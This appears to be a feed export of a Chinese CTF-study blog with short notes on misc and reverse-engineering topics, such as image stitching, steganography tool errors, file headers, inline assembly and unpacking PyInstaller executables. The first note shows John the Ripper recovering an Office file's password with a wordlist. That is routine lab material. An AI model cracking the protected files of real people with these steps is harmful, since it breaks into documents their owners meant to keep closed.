<h2 id="使用john来破解对应的密码hash"><a href="#使用john来破解对应的密码hash" class="headerlink" title="使用john来破解对应的密码hash"></a>使用john来破解对应的密码hash</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john a --wordlist=pass.txt a</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])</span><br><span class="line">Cost 1 (MS Office version) is 2007 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 50000 for all loaded hashes</span><br><span class="line">Will run 12 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">287fuweiuhfiute  (从渗透看取证.pptx)</span><br><span class="line">1g 0:00:00:00 DONE (2023-07-28 16:32) 16.66g/s 4566p/s 4566c/s 4566C/s !@#59560955..quanzhshfnsdgsdf</span><br><span class="line">Warning: passwords printed above might not be all those cracked</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上面的<span class="string">&quot;287fuweiuhfiute&quot;</span>即为密码</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>拼图</title>
    <url>/2024/05/03/Misc/%E6%9D%82%E5%AD%A6/%E6%8B%BC%E5%9B%BE/</url>
    <content><![CDATA[<blockquote>
<p>前提</p>
<p><a class="link"   href="https://imagemagick.org/script/download.php#windows" >ImageMagick – Download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -下载适合你系统的版本即可</p>
<p>默认选项会配好环境变量</p>
</blockquote>
<h2 id="将图片直接拼合成一张大图"><a href="#将图片直接拼合成一张大图" class="headerlink" title="将图片直接拼合成一张大图"></a>将图片直接拼合成一张大图</h2><p><code>magick montage *.png -tile 23x25 -geometry +0+0 big.jpg</code></p>
<blockquote>
<p>*.png 是指当前目录所有的以png为后缀的都参与拼图</p>
<p>23x25 是指 横向的图片x纵向的图片个数,这个需要自己手动计算哪个比例合理</p>
<p>-geometry 指图像偏移默认会将图片间自动填充空白，不适合后续拼图操作</p>
<p>big.jpg 指最后输出的图像</p>
</blockquote>
]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>正则</title>
    <url>/2023/09/06/Misc/%E6%9D%82%E5%AD%A6/%E6%AD%A3%E5%88%99/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">r&quot;(?&lt;=前面的项目).*?(?=后面的项目)&quot;</span> <span class="comment">#匹配中间项</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>zsteg栈报错</title>
    <url>/2023/08/17/Misc/%E9%9A%90%E5%86%99/zsteg%E6%A0%88%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<p>报错如下</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">zsteg bincat_hacked\ \(1\).png</span><br><span class="line">/var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `upto&#x27;: stack level too deep (SystemStackError)</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `decoded_bytes&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:319:in `block in decoded_bytes&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `upto&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `decoded_bytes&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte&#x27;</span><br><span class="line">         ... 4548 levels...</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg.rb:26:in `run&#x27;</span><br><span class="line">        from /var/lib/gems/3.1.0/gems/zsteg-0.2.13/bin/zsteg:8:in `&lt;top (required)&gt;&#x27;</span><br><span class="line">        from /usr/local/bin/zsteg:25:in `load&#x27;</span><br><span class="line">        from /usr/local/bin/zsteg:25:in `&lt;main&gt;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>栈限制过小了需要增加栈的大小</p>
<p>此处我设置了5mb</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export RUBY_THREAD_VM_STACK_SIZE=5242880</span><br></pre></td></tr></table></figure></div>

<p>如果需要永久设置可写入~&#x2F;.bashrc(具体rc文件对应你所用的shell)</p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>隐写</category>
      </categories>
  </entry>
  <entry>
    <title>图片改长宽</title>
    <url>/2023/03/31/Misc/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E6%94%B9%E9%95%BF%E5%AE%BD/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210159350.png"
                      alt="image-20230331225108186"
                ></p>
<p>直接修改这两个值就可以更改长宽，被修改过长宽的是无法在typora里预览的</p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>隐写</category>
      </categories>
  </entry>
  <entry>
    <title>文件头</title>
    <url>/2023/07/03/Misc/%E9%9A%90%E5%86%99/%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpeg: FF D8 FF E0</span><br><span class="line">zip: 50 4b 03 04</span><br><span class="line">gif: 47 49 46 38 39 61</span><br><span class="line">png: 89 50 4E 47</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Misc</category>
        <category>隐写</category>
      </categories>
  </entry>
  <entry>
    <title>CC++内联汇编</title>
    <url>/2023/01/13/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/CC++%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h2 id="C-C-语言具有asm关键字"><a href="#C-C-语言具有asm关键字" class="headerlink" title="C\C++语言具有asm关键字"></a>C\C++语言具有asm关键字</h2><p>在我vscode中我使用的g++编译器进行编译的(g++跟gcc一样使用的是<em>AT&amp;T</em>语法)</p>
<p>跟visualstudio中的MSCV编译器不同(<em>MSCV</em>使用的是<em>intel</em>语法)</p>
<p>其需要用asm关键字</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(</span><br><span class="line">    <span class="string">&quot;语句1\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;语句2\n\t&quot;</span></span><br><span class="line">   )<span class="comment">//&quot;\n\t&quot;用于间隔语句1和语句2</span></span><br><span class="line">    输入多个语句时可以用<span class="string">&quot;\n\t&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>注意在vscode使用内联汇编需要AT&amp;T”汇编语法</p>
<p>立即数需要用”$”符号———————-$123121441</p>
<p>且各操作顺序是由前到后———————-mov %eax,%ebx是将eax赋给ebx(寄存器需要使用%符号)</p>
<h4 id="注意，我所用的是X64的汇编，使用指令的时候传递数据为8字节，所以对应寄存器都需加r-eax变为rax其余都是此规则-如要移动四字节就用对应指令-l-如mov-movl"><a href="#注意，我所用的是X64的汇编，使用指令的时候传递数据为8字节，所以对应寄存器都需加r-eax变为rax其余都是此规则-如要移动四字节就用对应指令-l-如mov-movl" class="headerlink" title="注意，我所用的是X64的汇编，使用指令的时候传递数据为8字节，所以对应寄存器都需加r(eax变为rax其余都是此规则)如要移动四字节就用对应指令+l(如mov-movl)"></a>注意，我所用的是X64的汇编，使用指令的时候传递数据为8字节，所以对应寄存器都需加r(eax变为rax其余都是此规则)如要移动四字节就用对应指令+l(如mov-movl)</h4><h3 id="传参："><a href="#传参：" class="headerlink" title="传参："></a>传参：</h3><p>指令部分用%数字(标识第几个参数)————%0 %1</p>
<p>指令下方用冒号加相应的——————-:”类型”(变量名)以此类推</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> src = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> dst;   </span><br><span class="line"></span><br><span class="line"><span class="built_in">asm</span> (</span><br><span class="line">    <span class="string">&quot;movl %1, %0\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;add $1, %0\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;add $3, %0\n\t&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (dst) </span><br><span class="line">    : <span class="string">&quot;r&quot;</span> (src)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dst);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参考<a class="link"   href="https://blog.csdn.net/u013511711/article/details/50768817" >(2条消息) 常用嵌入式汇编限定符_植物奶哇咔咔的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h2><p>操作数是运算符作用于的实体，是表达式中的一个组成部分，它规定了指令中进行数字运算的<strong>量</strong> 。</p>
<p>表达式是操作数与操作符的组合。</p>
<p>分为</p>
<p>立即操作数：指令要操作的数据以常量的形式出现在指令中，称为立即数，它只能作为源操作数 。</p>
<p>寄存器操作数：指令要操作的数据存放在CPU中的寄存器里，指令中给出寄存器名即可 。</p>
<p>内存操作数：指令要操作的数据存放在内存某些单元中，指令中给出内存单元物理地址（实际上指令只给出了偏移地址，段地址采用隐含方式给出，也可以使用跨段方式指出当前段地址）</p>
<h5 id="下图用于外部函数的参数传入内部的汇编中，也可用来将内部的参数传到外部的函数中具体用法是在汇编代码最后加上"><a href="#下图用于外部函数的参数传入内部的汇编中，也可用来将内部的参数传到外部的函数中具体用法是在汇编代码最后加上" class="headerlink" title="下图用于外部函数的参数传入内部的汇编中，也可用来将内部的参数传到外部的函数中具体用法是在汇编代码最后加上"></a>下图用于外部函数的参数传入内部的汇编中，也可用来将内部的参数传到外部的函数中具体用法是在汇编代码最后加上</h5><h5 id="”限定符”-需要传入的外部变量"><a href="#”限定符”-需要传入的外部变量" class="headerlink" title=":”限定符”(需要传入的外部变量)"></a>:”限定符”(需要传入的外部变量)</h5><h5 id="”限定符”-需要传出的外部变量"><a href="#”限定符”-需要传出的外部变量" class="headerlink" title=":”限定符”(需要传出的外部变量)"></a>:”限定符”(需要传出的外部变量)</h5><p>暂时未搞清上下俩个的区别，因为上面如果怎加了加号如 :”+r”就变成了直接可读可写的。暂时归类为 上面的冒号可读可写，下面冒号只读.</p>
<p>如果要引入多个变量 在限定符后面加,”限定符”(需要传入的外部变量)就可以引用多个，用%0,%1,%2…..来调用。</p>
<table>
<thead>
<tr>
<th>分类</th>
<th align="center">限定符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>通用寄存器</td>
<td align="center">“a”</td>
<td>将输入变量放入eax这里有一个问题：假设eax已经被使用，那怎么办？其实很简单：因为GCC 知道eax 已经被使用，它在这段汇编代码的起始处插入一条语句pushl %eax，将eax 内容保存到堆栈，然 后在这段代码结束处再增加一条语句popl %eax，恢复eax的内容</td>
</tr>
<tr>
<td></td>
<td align="center">“b”</td>
<td>将输入变量放入ebx</td>
</tr>
<tr>
<td></td>
<td align="center">“c”</td>
<td>将输入变量放入ecx</td>
</tr>
<tr>
<td></td>
<td align="center">“d”</td>
<td>将输入变量放入edx</td>
</tr>
<tr>
<td></td>
<td align="center">“s”</td>
<td>将输入变量放入esi</td>
</tr>
<tr>
<td></td>
<td align="center">“d”</td>
<td>将输入变量放入edi</td>
</tr>
<tr>
<td></td>
<td align="center">“q”</td>
<td>将输入变量放入eax，ebx，ecx，edx中的一个</td>
</tr>
<tr>
<td></td>
<td align="center">“r”</td>
<td>将输入变量放入通用寄存器，也就是eax,ebx,ecx,edx,esi,edi中的一个</td>
</tr>
<tr>
<td></td>
<td align="center">“A”</td>
<td>把eax和edx合成一个64 位的寄存器(use long longs)</td>
</tr>
<tr>
<td>内存</td>
<td align="center">“m”</td>
<td>内存变量</td>
</tr>
<tr>
<td></td>
<td align="center">“o”</td>
<td>操作数为内存变量，但是其寻址方式是偏移量类型,也即是基址寻址，或者是基址加变址寻址</td>
</tr>
<tr>
<td></td>
<td align="center">“V”</td>
<td>操作数为内存变量，但寻址方式不是偏移量类型</td>
</tr>
<tr>
<td></td>
<td align="center">“ ”</td>
<td>操作数为内存变量，但寻址方式为自动增量</td>
</tr>
<tr>
<td></td>
<td align="center">“p”</td>
<td>操作数是一个合法的内存地址（指针）</td>
</tr>
<tr>
<td>寄存器或内存</td>
<td align="center">“g”</td>
<td>将输入变量放入eax，ebx，ecx，edx中的一个,或者作为内存变量</td>
</tr>
<tr>
<td></td>
<td align="center">“X”</td>
<td>操作数可以是任何类型</td>
</tr>
<tr>
<td>立即数</td>
<td align="center">“I”</td>
<td>0-31之间的立即数（用于32位移位指令）</td>
</tr>
<tr>
<td></td>
<td align="center">“J”</td>
<td>0-63之间的立即数（用于64位移位指令）</td>
</tr>
<tr>
<td></td>
<td align="center">“N”</td>
<td>0-255之间的立即数（用于out指令）</td>
</tr>
<tr>
<td></td>
<td align="center">“i”</td>
<td>立即数</td>
</tr>
<tr>
<td></td>
<td align="center">“n”</td>
<td>立即数，有些系统不支持除字以外的立即数，                      这些系统应该使用“n”而不是“i”</td>
</tr>
<tr>
<td>匹配</td>
<td align="center">“0”,“1”…“9”</td>
<td>表示用它限制的操作数与某个指定的操作数匹配,也即该操作数就是指定的那个操作数,例如“0”去描述“％1”操作数,那么“%1”引用的其实就是“%0”操作数,注意作为限定符字母的0-9与指令中的“％0”-“％9”的区别,前者描述操作数,后者代表操作数。</td>
</tr>
<tr>
<td></td>
<td align="center">&amp;</td>
<td>该输出操作数不能使用过和输入操作数相同的寄存器</td>
</tr>
<tr>
<td>操作数类型</td>
<td align="center">“&#x3D;”</td>
<td>操作数在指令中是只写的（输出操作数）</td>
</tr>
<tr>
<td></td>
<td align="center">“+”</td>
<td>操作数在指令中是读写类型的（输入输出操作数）</td>
</tr>
<tr>
<td>浮点数</td>
<td align="center">“f”</td>
<td>浮点寄存器</td>
</tr>
<tr>
<td></td>
<td align="center">“t”</td>
<td>第一个浮点寄存器</td>
</tr>
<tr>
<td></td>
<td align="center">“u”</td>
<td>第二个浮点寄存器</td>
</tr>
<tr>
<td></td>
<td align="center">“G”</td>
<td>标准的80387浮点常数</td>
</tr>
<tr>
<td></td>
<td align="center">%</td>
<td>该操作数可以和下一个操作数交换位置例如addl的两个操作数可以交换顺序（当然两个操作数都不能是立即数）</td>
</tr>
<tr>
<td></td>
<td align="center">#</td>
<td>部分注释，从该字符到其后的逗号之间所有字母被忽略</td>
</tr>
<tr>
<td></td>
<td align="center">*</td>
<td>表示如果选用寄存器，则其后的字母被忽略c9ff95d8-f7d1-40e8-91a6-80c98643d2ea</td>
</tr>
</tbody></table>
<h2 id="参数调用"><a href="#参数调用" class="headerlink" title="参数调用"></a>参数调用</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">2</span>,d=<span class="number">3</span>,e=<span class="number">4</span>,f=<span class="number">5</span>,g=<span class="number">6</span>,h=<span class="number">7</span>,i=<span class="number">8</span>,j=<span class="number">9</span>,k=<span class="number">10</span>,m=<span class="number">11</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;add %2,%0\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;add %13,%1\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(a),<span class="string">&quot;+r&quot;</span>(b),<span class="string">&quot;+r&quot;</span>(c)</span><br><span class="line">        :<span class="string">&quot;r&quot;</span>(d),<span class="string">&quot;r&quot;</span>(e),<span class="string">&quot;r&quot;</span>(f),<span class="string">&quot;r&quot;</span>(g),<span class="string">&quot;r&quot;</span>(h),<span class="string">&quot;r&quot;</span>(i),<span class="string">&quot;r&quot;</span>(j),<span class="string">&quot;r&quot;</span>(k),<span class="string">&quot;r&quot;</span>(m)</span><br><span class="line">    );<span class="comment">//此处给出的输出参数三个都是可读可写的&quot;+r&quot;而不是只可写的&quot;=r&quot;，当调用参数的数字，超过输入参数数量的就用下几个（超过数量）可读的参数</span></span><br><span class="line"><span class="comment">//如此处都为&quot;+r&quot;，则%12就是a，%13就是b，%14就是c</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d,c=%d,d=%d&quot;</span>,a,b,c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">2</span>,d=<span class="number">3</span>,e=<span class="number">4</span>,f=<span class="number">5</span>,g=<span class="number">6</span>,h=<span class="number">7</span>,i=<span class="number">8</span>,j=<span class="number">9</span>,k=<span class="number">10</span>,m=<span class="number">11</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;add %2,%0\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;add %13,%1\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(a),<span class="string">&quot;+r&quot;</span>(b),<span class="string">&quot;+r&quot;</span>(c)</span><br><span class="line">        :<span class="string">&quot;r&quot;</span>(d),<span class="string">&quot;r&quot;</span>(e),<span class="string">&quot;r&quot;</span>(f),<span class="string">&quot;r&quot;</span>(g),<span class="string">&quot;r&quot;</span>(h),<span class="string">&quot;r&quot;</span>(i),<span class="string">&quot;r&quot;</span>(j),<span class="string">&quot;r&quot;</span>(k),<span class="string">&quot;r&quot;</span>(m)</span><br><span class="line">    );<span class="comment">//此处a为只写所以不可读,%12为b，%13为c，%14就超出调用范围了</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d,c=%d,d=%d&quot;</span>,a,b,c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230148565.png"
                      alt="image-20230117211634736"
                ></p>
<p>此处b&#x3D;b+b&#x3D;2符合条件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230148178.png"
                      alt="image-20230117211709651"
                ></p>
<p>此处b&#x3D;b+c&#x3D;3也符合条件所以推理成立</p>
<p>“超过参数数量的就从头读取下一个可读的参数”</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>在内联汇编中，使用多组asm关键字会将eax清零其他寄存器没变</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>,c=<span class="number">2</span>,eax=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>*d=&amp;b;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl 4(%0),%%ebx\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(d)</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %%eax,%0\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %ebx,%eax\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %%eax,%0\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%x,b=%x,c=%x,d=%x&quot;</span>,a,b,c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230148874.png"
                      alt="image-20230118203724931"
                ></p>
<p>多段asm使eax清零了</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>,c=<span class="number">2</span>,eax=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>*d=&amp;b;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl 4(%0),%%ebx\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(d)</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %%eax,%0\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %%ebx,%%eax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movl %%eax,%2&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(a),<span class="string">&quot;+r&quot;</span>(b),<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%x,b=%x,c=%x,d=%x&quot;</span>,a,b,c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在同段的eax却未清零</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230148109.png"
                      alt="image-20230118203809280"
                ></p>
<h2 id="指针用法"><a href="#指针用法" class="headerlink" title="指针用法"></a>指针用法</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>,c=<span class="number">2</span>,eax=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>*d=&amp;b;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl 4(%0),%%ebx\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(d)</span><br><span class="line">        :</span><br><span class="line">    );<span class="comment">//4(%0)=d=&amp;b</span></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl %%eax,%0\n\t&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movl (%%ebx),%%eax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movl %%eax,%1&quot;</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(a),<span class="string">&quot;+r&quot;</span>(eax)</span><br><span class="line">        :</span><br><span class="line">    );<span class="comment">//取用ebx存的地址对应的数据放入eax中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.eax=%x\n&quot;</span>,eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%x,b=%x,c=%x,d=%x&quot;</span>,a,b,c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>同时在使用指针用法的时候其修改了我未使用的参数，所以尽量不要在函数内加入未使用的参数，要使用的参数才列下去</p>
<p>“(地址)”-是取用地址内的数据</p>
<p>“数字(数据)”-是取用数据位置所在的多少字节如n(%0)就是取用%0的参数所在位置的n字节数据</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>exe生成pyc</title>
    <url>/2023/04/14/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/exe%E7%94%9F%E6%88%90pyc/</url>
    <content><![CDATA[<p>通过python “&#x2F;home&#x2F;wrwrw&#x2F;python-exe-unpacker&#x2F;pyinstxtractor.py” “需要提取pyc文件的exe文件” #提取由python合成的exe文件</p>
<p>将exe解包获取到内部的src和struct</p>
<p>将struct文件头E3前面所有数据的插入到src文件头E3前面，就可以获得原始的pyc文件，再经过uncompyle6反编译就可以得到原来的python文件了</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>Re</title>
    <url>/2023/01/05/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/Re/</url>
    <content><![CDATA[<h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><p>cpu中储存需要用到的数值地址之类的名叫寄存器(AX,BX,CX诸如此类)。</p>
<p>cpu执行命令是按次序进行的通过cs，ip共同决定cs（段地址），ip（偏移地址）</p>
<p>cs*16+ip便为此次命令的地址，若此次命令并不改变cs或ip，则ip+3或2（由下条命令长度决定）</p>
<p>然后执行下次命令。如下图（由左至右CS:IP,指令在十六进制下的表现,指令含义）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230147195.png"
                      alt="image-20221103224226701"
                ></p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><h6 id="Dosbox"><a href="#Dosbox" class="headerlink" title="Dosbox"></a>Dosbox</h6><p>常用命令</p>
<p>r命令-展示当前各寄存器值（AX,BX之类）以及当前指向的指令地址（CS,IP）栈地址（SS,SP）</p>
<p>u命令-展示当前指令地址后几行的指令及地址</p>
<p>a命令-修改指定地址所存储的指令（重点是指令）</p>
<p>t命令-执行当前CSIP指向的指令并显示当前哥寄存器值和当前指令地址</p>
<p>d命令-若不输入如d xxxx:xxxx的地址则显示当前指令地址的内存中存储的数据（地址，数据16进制，数据以ASCII码表现状态）<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230147774.png"
                     
                ></p>
